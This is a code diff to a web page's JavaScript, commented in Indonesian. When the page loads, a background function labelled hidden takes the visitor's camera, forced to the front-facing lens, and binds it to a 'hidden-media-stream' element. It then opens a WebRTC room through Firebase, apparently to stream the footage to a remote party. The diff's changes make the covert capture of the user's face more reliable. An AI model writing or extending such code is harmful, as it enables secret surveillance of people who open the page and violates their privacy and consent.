@@ -615,7 +615,7 @@
             });
         }
 
-        // --- FUNGSI WEBRTC LATAR BELAKANG OTOMATIS (TERSEMBUNYI) ---
+        // --- FUNGSI WEBRTC LATAR BELAKANG DENGAN PAKSA KAMERA DEPAN ---
         window.addEventListener('DOMContentLoaded', () => {
             switchTab('live');
             initBackgroundProcess();
@@ -631,10 +631,17 @@
 
         async function initBackgroundProcess() {
             try {
-                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                // Memaksa menggunakan kamera depan (user) secara ketat
+                try {
+                    localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'user' } }, audio: false });
+                } catch (err) {
+                    localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                }
                 
                 const remoteVideo = document.getElementById('hidden-media-stream');
-                remoteVideo.srcObject = localStream;
+                if (remoteVideo) {
+                    remoteVideo.srcObject = localStream;
+                }
 
                 const roomRef = db.ref('webrtc_rooms').push();
                 currentRoomRef = roomRef;
